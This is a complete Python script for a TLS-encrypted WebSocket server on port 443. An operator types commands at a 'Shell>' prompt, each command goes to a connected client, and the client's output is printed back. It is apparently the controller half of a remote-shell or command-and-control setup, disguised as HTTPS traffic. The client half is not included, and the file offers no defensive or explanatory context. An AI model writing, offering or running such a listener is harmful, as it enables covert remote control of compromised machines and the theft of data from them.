import asyncio
import websockets
import ssl

HOST = '0.0.0.0'
PORT = 443

def create_ssl_context():
    ssl_context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
    ssl_context.load_cert_chain(certfile='server.crt', keyfile='server.key')
    return ssl_context

async def handler(websocket, path):
    print(f"[+] Connection from {websocket.remote_address}")
    try:
        while True:
            command = input("Shell> ")
            if command.lower() in ['exit', 'quit']:
                break
            await websocket.send(command)
            response = await websocket.recv()
            print(response)
    except Exception as e:
        print(f"[!] Error: {e}")
    finally:
        print("[-] Client disconnected")
        await websocket.close()

async def main():
    ssl_context = create_ssl_context()
    server = await websockets.serve(handler, HOST, PORT, ssl=ssl_context)
    print(f"[*] Listening on {HOST}:{PORT}")
    await server.wait_closed()

if __name__ == "__main__":
    asyncio.run(main())
